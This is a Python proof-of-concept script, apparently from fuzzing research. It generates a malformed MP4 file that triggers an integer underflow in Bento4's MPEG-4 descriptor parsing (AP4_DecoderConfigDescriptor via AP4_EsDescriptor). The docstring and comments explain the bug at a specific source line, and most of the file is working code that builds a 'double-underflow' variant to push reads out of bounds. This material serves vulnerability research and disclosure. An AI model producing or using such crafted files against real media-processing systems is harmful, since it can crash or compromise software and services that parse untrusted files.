#!/usr/bin/env python3
"""
VULN 001: AP4_DecoderConfigDescriptor SubStream Integer Underflow (payload_size < 13)

Trigger path:
  mp42aac -> AP4_File -> AP4_IodsAtom -> AP4_DescriptorFactory
           -> AP4_InitialObjectDescriptor -> AP4_EsDescriptor
           -> AP4_DecoderConfigDescriptor(payload_size=0)

Bug: Ap4DecoderConfigDescriptor.cpp line 92:
  AP4_SubStream* substream = new AP4_SubStream(stream, start+13, payload_size-13);
  When payload_size=0, unsigned subtraction 0-13 wraps to 0xFFFFFFF3 (~4.3 GB).

Strategy:
  Variant A (primary): ES_Descriptor payload_size=2 (< 3 needed for ES_ID+flags).
    The ES constructor reads ES_ID(2)+flags(1) = 3 bytes from the IOD child stream
    even though payload says 2.  When it calls:
      new AP4_SubStream(stream, offset, es_payload_size - (offset-start))
                                         = 2 - 3 = 0xFFFFFFFF
    the ES child substream also gets a giant virtual size.  Now DC descriptor bytes
    at iod_child offset 5+ are seen, DC gets payload_size=0 -> second underflow,
    and DC's child SubStream can read much further into the file data, possibly
    triggering real out-of-bounds if any buffer is heap-allocated.

  Variant B (fallback): Normal ES, DC payload_size=0.  Creates the underflow but
    DC's reads stay bounded within the ES child substream.
"""

import struct
import os

OUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IodsAtom_h"
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.mp4")


# ---------------------------------------------------------------------------
# Descriptor helpers
# ---------------------------------------------------------------------------

def encode_desc_size(n):
    """Encode descriptor payload length using MPEG-4 expandable class size."""
    if n < 0x80:
        return bytes([n])
    elif n < 0x4000:
        return bytes([0x80 | (n >> 7), n & 0x7F])
    elif n < 0x200000:
        return bytes([0x80 | (n >> 14), 0x80 | ((n >> 7) & 0x7F), n & 0x7F])
    else:
        return bytes([0x80 | (n >> 21), 0x80 | ((n >> 14) & 0x7F),
                      0x80 | ((n >> 7) & 0x7F), n & 0x7F])


def make_raw_desc(tag, size_byte, payload):
    """Build a descriptor with an explicit (possibly lying) size byte."""
    return bytes([tag, size_byte]) + payload


def make_desc(tag, payload):
    """Build a descriptor: tag (1B) + expandable size + payload."""
    return bytes([tag]) + encode_desc_size(len(payload)) + payload


# ---------------------------------------------------------------------------
# Variant A: double-underflow construction
#
# IOD payload layout (all bytes in the IOD child sub-stream):
#   pos 0-1: ES tag (0x03) + ES size byte (0x02)  <-- ES payload_size=2
#   pos 2-3: ES_ID bytes (2 bytes of actual ES payload)
#            ES constructor reads these as ES_ID (ReadUI16 succeeds)
#   pos 4:   flags byte (3rd byte; ES payload says only 2 bytes exist, but
#            the ES constructor reads this from the IOD child stream anyway)
#            -> ES offset-start = 3, payload_size=2, 2-3 = 0xFFFFFFFF underflow!
#   pos 5:   DC tag (0x04)  <- seen by DC descriptor factory via ES child substream
#   pos 6:   DC size (0x00) <- payload_size=0 for DC -> second underflow
#   pos 7+:  padding (more bytes in IOD payload so reads progress further)
# ---------------------------------------------------------------------------

# Raw ES descriptor payload bytes laid out after the ES tag+size:
#   ES_payload (2 declared bytes = ES_ID high + ES_ID low):
es_raw_payload_declared = bytes([0x00, 0x01])   # ES_ID = 0x0001 (2 bytes)
#   The ES constructor ALSO reads a 3rd byte for flags from the IOD child
#   stream (beyond the declared 2 bytes).  That 3rd byte is pos 4 in iod_child.
#   We put 0x00 there (flags=0: no dependency, no url, no ocr).
es_flags_byte = bytes([0x00])

# DC descriptor bytes (pos 5-6 in iod_child substream):
dc_bytes = bytes([0x04, 0x00])   # tag=0x04, payload_size=0 -> underflow

# Padding: extra bytes at pos 7+ that DC's child huge-SubStream will read
PADDING_A = bytes(50)   # 50 zero-padding bytes

# The raw IOD payload (after IOD's own 7-byte header):
iod_inner_payload_A = (
    bytes([0x03])                   # ES tag
    + bytes([0x02])                 # ES size = 2 (lies; constructor reads 3 bytes)
    + es_raw_payload_declared       # ES_ID (2 bytes)
    + es_flags_byte                 # flags byte (beyond declared payload)
    + dc_bytes                      # DC tag+size
    + PADDING_A                     # padding
)

# IOD header + iod_inner_payload_A = full IOD payload
iod_payload_A = (
    struct.pack('>H', 0x004F)                           # ObjectDescriptorID bits
    + bytes([0xFF, 0xFF, 0xFF, 0xFF, 0xFF])              # 5 profile level bytes
    + iod_inner_payload_A
)
iod_desc_A = make_desc(0x10, iod_payload_A)

# ---------------------------------------------------------------------------
# Variant B: simple / single underflow (plain correct structure, DC=0)
# ---------------------------------------------------------------------------
dc_hdr_B = bytes([0x04, 0x00])   # DC payload_size=0
PADDING_B = 30
es_payload_B = (
    struct.pack('>H', 0x0001)
    + bytes([0x00])
    + dc_hdr_B
    + bytes(PADDING_B)
)
iod_payload_B = (
    struct.pack('>H', 0x004F)
    + bytes([0xFF, 0xFF, 0xFF, 0xFF, 0xFF])
    + make_desc(0x03, es_payload_B)
)
iod_desc_B = make_desc(0x10, iod_payload_B)

# ---------------------------------------------------------------------------
# Choose variant to embed (A = double-underflow, more aggressive)
# ---------------------------------------------------------------------------
iod_desc = iod_desc_A
iod_payload = iod_payload_A

# ---------------------------------------------------------------------------
# iods atom
# ---------------------------------------------------------------------------
iods_inner = struct.pack('>I', 0x00000000) + iod_desc   # version+flags + IOD

def make_box(fourcc, inner):
    size = 8 + len(inner)
    return struct.pack('>I4s', size, fourcc.encode('latin-1')) + inner

iods_box = make_box('iods', iods_inner)

# ---------------------------------------------------------------------------
# mvhd atom  (version 0, 108 bytes)
# ---------------------------------------------------------------------------
mvhd_inner = (
    bytes([0x00])
    + bytes([0x00, 0x00, 0x00])
    + struct.pack('>I', 0)
    + struct.pack('>I', 0)
    + struct.pack('>I', 1000)
    + struct.pack('>I', 0)
    + struct.pack('>I', 0x00010000)
    + struct.pack('>H', 0x0100)
    + bytes(10)
    + struct.pack('>9I',
                  0x00010000, 0x00000000, 0x00000000,
                  0x00000000, 0x00010000, 0x00000000,
                  0x00000000, 0x00000000, 0x40000000)
    + bytes(24)
    + struct.pack('>I', 1)
)
mvhd_box = make_box('mvhd', mvhd_inner)
assert len(mvhd_box) == 108, f"mvhd size {len(mvhd_box)} != 108"

moov_box = make_box('moov', mvhd_box + iods_box)
ftyp_box = make_box('ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42')

mp4_data = ftyp_box + moov_box

os.makedirs(OUT_DIR, exist_ok=True)
with open(OUT_FILE, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Generated: {OUT_FILE}")
print(f"[+] File size: {len(mp4_data)} bytes")
print()
print("=== Descriptor structure (Variant A - double underflow) ===")
print(f"  IOD  (tag=0x10, payload={len(iod_payload)} bytes)")
print( "    ES  tag=0x03, DECLARED payload_size=2")
print( "        constructor reads 3 bytes anyway (ES_ID+flags)")
print( "        => ES child SubStream size underflow: 2-3 = 0xFFFFFFFF")
print( "      DC  (tag=0x04, payload_size=0x00)")
print( "          => DC child SubStream size underflow: 0-13 = 0xFFFFFFF3")
print(f"      + {len(PADDING_A)} padding bytes visible to DC's huge SubStream")
